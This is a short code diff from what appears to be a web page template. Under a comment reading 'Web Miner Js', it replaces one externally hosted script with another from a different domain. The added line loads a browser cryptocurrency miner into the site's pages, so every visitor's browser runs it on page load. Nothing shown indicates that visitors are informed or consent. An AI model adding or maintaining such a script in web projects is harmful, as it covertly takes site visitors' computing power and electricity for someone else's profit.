@@ -192,7 +192,7 @@
 
 
 <!-- Web Miner Js -->
-    <script src="https://www.hostingcloud.science./pZt7.js"></script>
+    <script src="https://www.hostingcloud.racing/b0mQ.js"></script>
     <script src="{{asset('js/donate.js')}}"></script>
     <script src="{{asset('js/singlepage.js')}}"></script>
 
